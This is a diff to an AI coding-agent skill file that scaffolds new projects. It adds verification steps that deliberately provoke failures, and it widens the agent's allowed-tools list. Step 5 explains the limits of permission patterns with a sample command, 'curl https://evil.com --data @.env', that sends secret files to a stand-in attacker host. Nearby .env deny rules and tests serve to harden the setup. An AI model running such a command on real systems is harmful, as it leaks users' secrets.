@@ -1,7 +1,7 @@
 ---
 name: init-project
 description: Scaffold a new project in the current directory — git init, README.md, CLAUDE.md, AGENTS.md, Claude settings.json, linter/test config, unused-code detection (knip for TypeScript), runtime pin, lockfile (npm for TypeScript, uv for Python), supply-chain hardening (SHA-pinned GitHub Actions, least-privilege GITHUB_TOKEN, Dependabot cooldown, pinned container base images), and CI (GitHub Actions + Dependabot) for the specified language (TypeScript, Go, Python, Swift for a macOS SwiftUI app via XcodeGen/SwiftLint/Swift Testing), plus optional overlays — Next.js boilerplate with error boundaries, security headers, SEO, and a health endpoint; an AI agent CLI/worker app on the Anthropic SDK (tool runner, env handling, offline tests); a Cloudflare Worker (wrangler.jsonc, generated types, workerd-native vitest pool, secrets and deploy guidance); and opt-in Sentry error tracking wired DSN-optional for any of those languages. Use this skill when the user wants to initialize or bootstrap a new project from scratch, set up a fresh repo, or scaffold project boilerplate.
-allowed-tools: Bash(node --env-file-if-exists=.env src/index.ts --help), Bash(git init), Bash(git init *), Bash(git status *), Bash(git rev-parse *), Bash(git add *), Bash(git commit -m *), Bash(git ls-remote *), Bash(node -v), Bash(npm -v), Bash(npm view *), Bash(npm install *), Bash(npm run build*), Bash(npm run knip*), Bash(npm run lint*), Bash(npm test), Bash(npm test *), Bash(npm run typecheck*), Bash(npx biome *), Bash(npx knip*), Bash(go mod init *), Bash(go mod edit -go*), Bash(go mod download), Bash(go mod tidy), Bash(go get github.com/getsentry/sentry-go*), Bash(go vet *), Bash(go build *), Bash(go test *), Bash(go version), Bash(go list -m *), Bash(go run golang.org/x/vuln/cmd/govulncheck*), Bash(go run golang.org/x/tools/cmd/deadcode*), Bash(golangci-lint config verify*), Bash(golangci-lint run*), Bash(golangci-lint fmt*), Bash(golangci-lint --version), Bash(uv --version), Bash(uv init *), Bash(uv python pin *), Bash(uv python list), Bash(uv add *), Bash(uv lock*), Bash(uv sync*), Bash(uv run ruff *), Bash(uv run mypy*), Bash(uv run pytest*), Bash(uv run vulture*), Bash(xcodegen generate), Bash(xcodegen --version), Bash(swift --version), Bash(swift format *), Bash(swiftlint *), Bash(swiftlint version), Bash(xcodebuild -version), Bash(xcodebuild build*), Bash(xcodebuild test*), Bash(periphery scan*), Bash(periphery version), Bash(sw_vers*), Bash(ls), Bash(ls *), Bash(tree), Bash(tree *), Bash(mkdir *), Bash(ln -s *), Bash(rm -rf next-env.d.ts .next tsconfig.tsbuildinfo), Bash(rm -rf worker-configuration.d.ts tsconfig.tsbuildinfo), Bash(npx wrangler types), Bash(curl -sS -o * https://raw.githubusercontent.com/vercel/next.js/*), Bash(curl -sS -o * https://raw.githubusercontent.com/cloudflare/workers-sdk/*), Read, Write, Edit, Glob, Skill, WebFetch(domain:github.com), WebFetch(domain:raw.githubusercontent.com), WebFetch(domain:platform.claude.com), WebFetch(domain:docs.sentry.io)
+allowed-tools: Bash(node --env-file-if-exists=.env src/index.ts --help), Bash(git init), Bash(git init *), Bash(git status *), Bash(git rev-parse *), Bash(git symbolic-ref *), Bash(git check-ignore *), Bash(git log *), Bash(git add *), Bash(git commit -m *), Bash(git push *), Bash(git ls-remote *), Bash(gh run *), Bash(jq *), Bash(yq *), Bash(diff *), Bash(grep *), Bash(readlink *), Bash(head *), Bash(node -v), Bash(npm -v), Bash(npm view *), Bash(npm install *), Bash(npm run build*), Bash(npm run knip*), Bash(npm run lint*), Bash(npm test), Bash(npm test *), Bash(npm run typecheck*), Bash(npx biome *), Bash(npx knip*), Bash(go mod init *), Bash(go mod edit -go*), Bash(go mod download), Bash(go mod tidy), Bash(go get github.com/getsentry/sentry-go*), Bash(go vet *), Bash(go build *), Bash(go test *), Bash(go version), Bash(go list -m *), Bash(go run golang.org/x/vuln/cmd/govulncheck*), Bash(go run golang.org/x/tools/cmd/deadcode*), Bash(golangci-lint config verify*), Bash(golangci-lint run*), Bash(golangci-lint fmt*), Bash(golangci-lint --version), Bash(uv --version), Bash(uv init *), Bash(uv python pin *), Bash(uv python list), Bash(uv add *), Bash(uv lock*), Bash(uv sync*), Bash(uv run ruff *), Bash(uv run mypy*), Bash(uv run pytest*), Bash(uv run vulture*), Bash(xcodegen generate), Bash(xcodegen --version), Bash(swift --version), Bash(swift format *), Bash(swiftlint *), Bash(swiftlint version), Bash(xcodebuild -version), Bash(xcodebuild build*), Bash(xcodebuild test*), Bash(periphery scan*), Bash(periphery version), Bash(sw_vers*), Bash(ls), Bash(ls *), Bash(tree), Bash(tree *), Bash(mkdir *), Bash(ln -s *), Bash(rm -rf next-env.d.ts .next tsconfig.tsbuildinfo), Bash(rm -rf worker-configuration.d.ts tsconfig.tsbuildinfo), Bash(npx wrangler types), Bash(curl -sS -o * https://raw.githubusercontent.com/vercel/next.js/*), Bash(curl -sS -o * https://raw.githubusercontent.com/cloudflare/workers-sdk/*), Read, Write, Edit, Glob, Skill, WebFetch(domain:github.com), WebFetch(domain:raw.githubusercontent.com), WebFetch(domain:platform.claude.com), WebFetch(domain:docs.sentry.io)
 ---
 
 ## Instructions
@@ -24,7 +24,16 @@ Then work through the steps below. **Skip any step where the file already exists
 
 **Never copy a version number or SHA out of this skill.** Anything version-shaped in these files — `{tag}`, `{sha}`, `{exact current node version}`, `{installed-biome-version}` — is a placeholder to resolve at scaffold time, and any literal version in prose is there to explain a failure, not to be pinned. Resolve the current release yourself (`npm view <pkg> version`, `git ls-remote --tags`, `<tool> --version`), confirm it is problem-free by running the step's verification, and write *that* value into the project. A version baked into this skill is only as fresh as the last edit to it; a scaffold that pins it inherits that staleness on day one. The generated project pins hard — exact versions, SHAs, digests — precisely so that the resolving happens here, once, deliberately.
 
-**Verify before moving on.** Each language reference ends with a verification block. A scaffold whose own toolchain does not pass is worse than no scaffold: it hands the user a broken baseline they will assume is correct.
+**Verify before moving on — and verify the gate bites.** A scaffold whose own toolchain does not pass is worse than no scaffold: it hands the user a broken baseline they will assume is correct. So every step below ends with a **Verify** block, and each language reference ends with one too. A step is not done when its files exist; it is done when its Verify block has been *run* and passed.
+
+Prefer verification that could actually fail. Wherever a step's whole value is a gate — `.gitignore`, the `.claude/settings.json` denies, every lint / typecheck / unused-code check — confirming it passes proves nothing on its own: a `formatters` block missing from `.golangci.yml`, a `vcs` block missing from `biome.json`, and no linter at all all produce the same green run. **Provoke the failure**: deliberately violate what the step protects, confirm the gate exits non-zero, then remove the violation. Where a command can be run rather than a file inspected, run it.
+
+Two rules that make those negative tests safe:
+
+- **Every negative test removes its own violation before the step ends.** A leftover unformatted file or throwaway `bad.ts` otherwise ships in Step 12's initial commit. Confirm with `git status --porcelain` at Step 12.
+- **A negative test needs a positive control.** "The gate rejects X" is only half of it; "the gate still accepts the scaffold" is the other half, and it is what catches an over-broad rule. The `.env` deny is the clearest case: blocking `.env` while also blocking `.env.example` is a failure, not a stricter pass.
+
+Where a step cannot be verified that way — Step 1 cannot fabricate an enclosing repository around the user's project — say so in Step 10 rather than reporting the weaker check as if it settled the question.
 
 ### Language references
 
@@ -46,9 +55,20 @@ Each language reference covers that language's package/dependency setup, linter 
 
 ### Step 1: Git
 
-Run `git rev-parse --show-toplevel` and compare it against the current directory. Run `git init -b main` unless the two are **identical**. Do not test with `git rev-parse --is-inside-work-tree` — it answers "am I inside *any* repo", so in a subdirectory of an existing checkout (a monorepo package, a scratch dir inside a tracked tree) it returns `true`, `git init` gets skipped, and Step 11 then commits the scaffold into the *enclosing* repository. `-b main` fixes the branch name the CI workflow triggers on (`branches: [main]` in `references/supply-chain.md`) regardless of the machine's `init.defaultBranch`.
+Run `git rev-parse --show-toplevel` and compare it against the current directory. Run `git init -b main` unless the two are **identical**. Do not test with `git rev-parse --is-inside-work-tree` — it answers "am I inside *any* repo", so in a subdirectory of an existing checkout (a monorepo package, a scratch dir inside a tracked tree) it returns `true`, `git init` gets skipped, and Step 12 then commits the scaffold into the *enclosing* repository. `-b main` fixes the branch name the CI workflow triggers on (`branches: [main]` in `references/supply-chain.md`) regardless of the machine's `init.defaultBranch`.
 
-Remember whether this step created the repo — Step 11's staging rule depends on it.
+Remember whether this step created the repo — Step 12's staging rule depends on it.
+
+**Verify.** Two assertions, both cheap and both load-bearing:
+
+```bash
+git rev-parse --show-toplevel   # must print this project directory, nothing above it
+git symbolic-ref --short HEAD   # must print: main
+```
+
+The second is not redundant with passing `-b main`. When the toplevel already matched and `git init` was therefore *skipped*, the branch is whatever the enclosing checkout is on — and the CI workflow triggers on `branches: [main]`, so a repo sitting on `master` scaffolds a CI that never runs. That failure is silent until someone wonders why no check appears on the first PR. If HEAD is not `main` and the repo has no commits yet, `git branch -m main` fixes it; if it has commits, stop and ask — renaming someone's existing branch is not this skill's call.
+
+**Not verifiable by provoking the failure.** The failure this step guards is "running inside an enclosing repository", which cannot be provoked from inside the user's project without creating a repo above it. The toplevel assertion above *is* the check.
 
 ### Step 2: README.md
 
@@ -93,6 +113,20 @@ Substitute the language's real commands — the same ones the CLAUDE.md Developm
 Multiple commands in one cell go on separate lines inside the *same* fenced block of their README section — one fence per section, not per command. Where the Build cell is "—" the language genuinely has no build step (plain TypeScript sets `noEmit: true`, so `typecheck` is the only `tsc` run; the AI agent overlay runs `src/` directly via Node's TypeScript type stripping; Cloudflare Workers is bundled by `wrangler` at dev/deploy time; Python has no compile). Do not invent one: write "No build step" with the one-line reason under the Build heading instead of leaving it dangling or mislabeling `typecheck` as a build. Go commands that embed a resolved version (`govulncheck@{version}`, `deadcode@{version}`) are resolved in Steps 7–8 — backfill them into both files then rather than resolving out of order here.
 
 Write the command blocks **identically** in both files and keep them in sync when they change — the two are generated in the same pass so they start aligned, and a README whose commands have drifted from the real ones is worse than a bare title. (CLAUDE.md additionally carries scaffold-time constraints the README does not — the identical-commands rule covers the command blocks, not the surrounding prose.) Leave the `Overview` placeholder for the user; the background needs human judgment, same as CLAUDE.md's Context.
+
+**Verify — run every command this file advertises.** This is the step's whole point, so do not settle for reading the file back. After Step 7 has installed the toolchain, take each line out of README.md's Development block **verbatim** — copy it, do not retype it from memory or from the table above — and run it. All must exit 0.
+
+Run the language reference's verification block *this way* rather than as a separate list. The two check the same commands, and routing the run through the README is what turns a documentation claim into a tested one: if README says `npm run lint` while `package.json` defines only `lint:check`, a separate verification list passes and the README is still wrong. Copying from the file catches it; anything else re-verifies the tool and leaves the document unverified.
+
+Note the ordering this implies: README.md is *written* at Step 2 but *verified* at Step 7, because before the toolchain exists none of its commands can run. Do not "fix" a failing command by editing the README to match a script that already exists — decide which name is right, then make both files and `package.json` agree.
+
+**Verify — the two files have not drifted.** README.md and CLAUDE.md must carry byte-identical command blocks. Fence every command block in *both* files as ```` ```bash ````, one fence per section, so the comparison is mechanical rather than a judgment call:
+
+```bash
+diff <(sed -n '/^```bash$/,/^```$/p' README.md) <(sed -n '/^```bash$/,/^```$/p' CLAUDE.md)
+```
+
+Empty output is the pass. They are generated in the same pass so they start aligned; this asserts that they still are after any backfill (the Go version resolved in Steps 7–8 is written into both, and updating only one is the easy mistake).
 
 ### Step 3: CLAUDE.md
 
@@ -149,6 +183,20 @@ Fill in the Development section with concrete commands based on the language/fra
 
 Record in the Constraints section any constraint discovered during scaffolding that a future reader would otherwise undo — a dependency held back a major version, a linter rule that cannot be enabled yet, a component renamed to satisfy a lint gate. The language references call these out where they arise; every one of them belongs here, not only the convenient ones.
 
+**Verify — assert both directions on every conditional section.** This template is adapted per intake, and the failure mode is a section that survived a branch it should not have. A one-way grep ("is it there?") cannot see that, so check presence *and* absence:
+
+| Intake | Must be present | Must be absent |
+|---|---|---|
+| `library` / `cli` | — | the whole `Launch Readiness` section |
+| any other type | `Launch Readiness` | — |
+| non-Next.js | — | any mention of `next.config` |
+| question 7 = `none` | the unscaffolded error-tracking bullet | `Sentry.init` claims |
+| question 7 = `sentry` (after Step 9) | the replacement wording from `references/sentry.md` | the "not scaffolded here" error-tracking bullet |
+
+`grep -c` each of these and confirm the count is what the table says — `0` is a result to assert, not a reason to skip the check. The `sentry` row cannot pass until Step 9 has run; re-run it there rather than declaring it now.
+
+**Verify.** The Development block matches README.md — the `diff` in Step 2 covers both files at once, so run it once, not twice.
+
 ### Step 4: AGENTS.md
 
 Create a symlink `AGENTS.md -> CLAUDE.md` so that other AI coding tools (e.g., GitHub Copilot) read the same project instructions:
@@ -156,6 +204,15 @@ Create a symlink `AGENTS.md -> CLAUDE.md` so that other AI coding tools (e.g., G
 ```bash
 ln -s CLAUDE.md AGENTS.md
 ```
+
+**Verify — read *through* the link, don't just look at it.**
+
+```bash
+readlink AGENTS.md   # must print exactly: CLAUDE.md
+head -1 AGENTS.md    # must print the "# Project: ..." heading
+```
+
+The second is the one that matters. `readlink` passes on a **dangling** symlink — one created before CLAUDE.md existed, or pointing at a path that was later renamed — and a dangling `AGENTS.md` is worse than a missing one: every tool that reads it gets an I/O error instead of falling back. Reading the first line through the link is what proves the target resolves. (Ordering follows from this: Step 3 must have created CLAUDE.md before this step runs. If it did not, `ln -s` still succeeds — `ln` does not check the target — which is exactly why this check exists.)
 
 ### Step 5: .claude/settings.json
 
@@ -210,6 +267,24 @@ To cover subdomains, note that `WebFetch(domain:*.example.com)` matches `api.exa
 
 The two `curl` patterns are deliberately loose, and this is a trade-off rather than a boundary. Claude Code matches `Bash(...)` against the whole command string, so `curl * api.example.com*` also allows a command that merely *mentions* the domain after another URL (`curl https://evil.com --data @.env api.example.com`). Tightening it to `Bash(curl -s https://api.example.com/*)` closes that hole but re-prompts whenever a flag is added or reordered — and per the [permissions docs](https://code.claude.com/docs/en/permissions), argument-constraining Bash patterns are fragile in both directions anyway (they miss `-X GET` before the URL, `https` vs `http`, `-L` redirects, and `$URL` variables). Since allowing `Bash` at all already lets Claude reach any URL via `curl`, treat these entries as prompt reduction for local development, not as network access control. If this project handles real secrets, enforce the boundary properly instead: deny `curl`/`wget` and route fetches through `WebFetch`, or validate URLs in a `PreToolUse` hook.
 
+**Verify — the file parses, the denies are symmetric, and no rule is inert.**
+
+```bash
+jq empty .claude/settings.json
+jq -r '([.permissions.deny[]|select(startswith("Read("))|ltrimstr("Read(")|rtrimstr(")")]
+        - [.permissions.deny[]|select(startswith("Edit("))|ltrimstr("Edit(")|rtrimstr(")")]) as $m
+       | if ($m|length)==0 then "ok" else "MISSING Edit deny: \($m|join(", "))" end' .claude/settings.json
+jq -r '[.permissions.deny[],.permissions.allow[]] | map(select(startswith("Write("))) | length' .claude/settings.json
+```
+
+The first must exit 0 (a settings file Claude Code cannot parse is silently ignored — the denies then do not exist at all, with no error anywhere). The second must print `ok`: it lists every path denied for `Read` but not for `Edit`, which is exactly the half-closed state this step warns about, and the state you fall into by extending the list from memory. The third must print `0` — a `Write(path)` rule is accepted but never matched, so it reads as protection while providing none.
+
+**Verify — provoke the block, and confirm the positive control.** Ask Claude, in this project, to (a) read `.env`, (b) write to `.env`, and (c) read `.env.example`. Expected: (a) and (b) are refused with **no permission prompt** — a prompt means the rule missed and something merely fell through to `ask`; (c) succeeds. Create a throwaway `.env` holding a dummy value first if none exists, and delete it afterwards.
+
+(c) is not padding. `Read(.env.*)` instead of the enumerated list produces the same result for (a) and (b) and silently breaks the one env file that is *meant* to be read — the Next.js path writes to `.env.example`, so an over-broad glob turns into a scaffold failure several steps later, far from its cause.
+
+Do not substitute `cat .env` in a shell for (a). A `deny` covers the file-reading Bash commands Claude Code recognizes, so it should also be blocked — but that path exercises the command allow-list, not the file rule, and an arbitrary subprocess would get through either way (see the boundary note above). Test the tools that the rule actually governs.
+
 ### Step 6: .gitignore
 
 Create `.gitignore` **before** the language setup below runs — its content is fully determined by the intake language, and the next step's verification depends on it. `references/typescript.md` sets Biome's `useIgnoreFile: true`, making `.gitignore` the single source of truth for what tooling skips; the Next.js verification runs `npm run build` (which populates `.next/` in-tree) and then lints again. A `.gitignore` written any later would arrive too late, `biome check` would exit 1 on that generated output, and the fix an agent reaches for — a `biome.json` exclude — quietly undoes the single-source design. Creating it here also pre-covers Go's build artifacts and Python's `.venv`. (Step 1's `git init` must already have run — Biome resolves the VCS root from `.git/`.)
@@ -231,15 +306,38 @@ Then add the language-specific entries (from the reference you read for this lan
 - **Next.js** (in addition to TypeScript): `.next/`, `out/`, `next-env.d.ts` — the last is generated by `next dev`/`next build`/`next typegen`, so leaving it tracked commits a generated file that re-diffs on every Next.js bump and becomes a Biome lint target. The pinned `create-next-app` template ignores it, and [the Next.js docs say to](https://nextjs.org/docs/app/api-reference/config/typescript#next-envdts); match that rather than hand-diverging. Ignoring it is what makes the `typecheck` script in `references/nextjs.md` generate it (`next typegen && tsc --noEmit`) instead of assuming it — the two decisions are a pair, so do not "fix" a CI type error by tracking the file.
 - **Go** and **Python**: see their references.
 
+**Verify — the secret is ignored *and* the template is not.** Create the two files if they do not exist yet (a pattern only matches a path, so `check-ignore` needs something to match), then:
+
+```bash
+git check-ignore .env          # must exit 0 — ignored
+git check-ignore .env.example  # must exit 1 — NOT ignored
+```
+
+**Do not add `-v` to the second command.** Verified: `git check-ignore -v .env.example` prints `.gitignore:4:!.env.example` and **exits 0**, because with `-v` the negation counts as a match — so the obvious "show me which rule applied" form inverts the very assertion it looks like it is making, and a broken `!.env.example` line would pass. Use `-v` to *read* the matching rule, never as the pass/fail check.
+
+Both halves matter. Exit 0 on the first proves secrets stay untracked; exit 1 on the second proves the negation survived, and it is the half that fails when the leading `!` gets lost or the two lines get reordered (a negation before its pattern does nothing).
+
+**Verify — nothing generated escapes the ignore list.** This one cannot run yet; run it at the end of Step 7, after the language toolchain has built at least once:
+
+```bash
+git status --porcelain   # must be empty of build output
+```
+
+`node_modules/`, `.next/`, `dist/`, `.venv/`, and the Go binary all appear only once something has run, so a missing entry is invisible until then — which is precisely why the check belongs after the build rather than here. Anything listed that is generated is a missing `.gitignore` entry; fix `.gitignore`, not the tool's output path.
+
 ### Step 7: Language setup
 
 Follow the language reference from the table above — dependencies, linter, tests, unused-code detection, runtime pin, and its verification block. For a served web app or API, the reference also covers security headers, SEO, and the health endpoint.
 
 **Work through each reference top to bottom; its section order is load-bearing.** The TypeScript path in particular must write `.npmrc` before installing anything, because npm applies those settings only to installs that run after the file exists.
 
+**Verify.** Run the reference's verification block, invoking each command by copying it out of README.md (Step 2) so the same run validates the document. That block now has two halves: the gates pass on the clean scaffold, and each gate is shown to **reject** a deliberate violation. Run both — the second is what distinguishes a configured linter from a linter whose config never loaded.
+
+Then run Step 6's deferred `git status --porcelain` check, now that the toolchain has produced build output.
+
 ### Step 8: CI & Dependabot
 
-Follow `references/supply-chain.md`.
+Follow `references/supply-chain.md`, including its verification block — the pin checks there are the only thing standing between a SHA-pinned workflow and one that merely looks pinned.
 
 ### Step 9: Error tracking — only if intake question 7 answered `sentry`
 
@@ -247,11 +345,36 @@ Follow `references/sentry.md`. Skip this step entirely otherwise; nothing later 
 
 It runs **after** CI on purpose. The overlay edits files the earlier steps create — `next.config.ts`, `app/global-error.tsx`, the language entry point, `.env.example`, and `.github/workflows/ci.yml` — so running it last means editing files that exist rather than forward-declaring what a later step must remember to include. Its own verification block re-runs the language gates, which is what catches a wrapper or an import that broke them.
 
-### Step 10: Summary
+**Verify.** Run that block, and re-run Step 3's conditional-section check — the `sentry` row of its table only becomes assertable now, because this step is what rewrites the error-tracking bullet.
+
+### Step 10: Acceptance check
+
+Before summarizing, walk back through Steps 1–9 and confirm every **Verify** block was actually run. This step exists because the failure it catches is not a failing check — it is a check that was read and skipped, which leaves no trace at all.
+
+For each step, record one of:
+
+- **Passed** — the commands ran and gave the expected result. Name the check, not just the step.
+- **Not applicable** — the step was skipped (Sentry not chosen, a file already existed). Say which.
+- **Not verifiable here** — Step 1's enclosing-repository case, or a check needing a git remote that does not exist yet. Say what would settle it.
+
+Any step that is none of these three is unfinished; go back and run it. Do not carry an unverified step into the summary — that is precisely the "broken baseline the user assumes is correct" this skill's rules warn about, and it is invisible once the scaffold is committed.
+
+Two whole-tree checks belong here rather than to any single step, because both only mean something once everything has run:
+
+```bash
+git status --porcelain                                   # no stray file from a negative test
+grep -rn "{project-name}\|{AppName}\|{version}\|{sha}" --exclude-dir=.git .   # no unresolved placeholder
+```
+
+The first catches a violation file a negative test forgot to remove — it would otherwise be committed in Step 12 as part of the baseline. The second catches a placeholder copied through verbatim: every brace-wrapped token in this skill is meant to be resolved at scaffold time, and one that survives into the project is a defect that reads as intentional to the next person.
+
+### Step 11: Summary
 
 Run `tree -a -I '.git|node_modules|.next|.venv' --dirsfirst` and show the user what was created — the dependency/build dirs must be excluded or the summary is thousands of lines. Also list any working files the scaffold process itself left behind (displaced caches, verification leftovers) so nothing undocumented ships. List any files that were skipped because they already existed, and any constraint recorded in CLAUDE.md during Step 7 or Step 9.
 
-### Step 11: Initial commit
+Include the Step 10 record — per step, what was verified and how, plus anything left unverified and why. A summary that lists created files without saying what was checked hands the user a tree and lets them assume the rest.
+
+### Step 12: Initial commit
 
 Create the initial commit by invoking the **`commit` skill**, so the scaffold's first commit follows the same conventional-commit workflow as every other commit in this environment.
 
@@ -268,3 +391,24 @@ If the environment has no `commit` skill — init-project is meant to work stand
 git add <all created files>
 git commit -m "chore: scaffold project with initial config"
 ```
+
+**Verify — the commit holds what it should and nothing else.**
+
+```bash
+git log -1 --name-only --format=          # every path here was created by this skill
+git status --porcelain                    # empty, or only pre-existing files this skill did not touch
+git rev-parse --show-toplevel             # still this project directory
+```
+
+Read the first list against what Step 11 reported as created. Two failures hide here and both survive a green `git commit`: a file the scaffold created but never staged (the baseline is incomplete, and the gap surfaces as a CI failure on someone else's first PR), and a file that was *not* created by this skill riding along — the `git add .` case in a pre-existing repo, which quietly commits someone's unrelated work-in-progress under a `chore: scaffold` message.
+
+**Verify — CI actually runs and is green.** This needs a remote, so it is the one check that may have to wait. If the project has one:
+
+```bash
+git push -u origin main
+gh run watch
+```
+
+The workflow must trigger and pass. Everything before this verified the gates on *this* machine, with its ambient toolchain and its caches; CI is where the runtime pin, the `go-version-file`/`.nvmrc` reading, the `branches: [main]` trigger, and the SHA-pinned actions are exercised for the first time. A workflow that never triggers looks identical to one that passes if nobody goes and looks.
+
+If there is no remote yet, say so in the summary as an outstanding check with the exact commands above, rather than dropping it — this is the single highest-value verification in the whole scaffold and the easiest to lose.
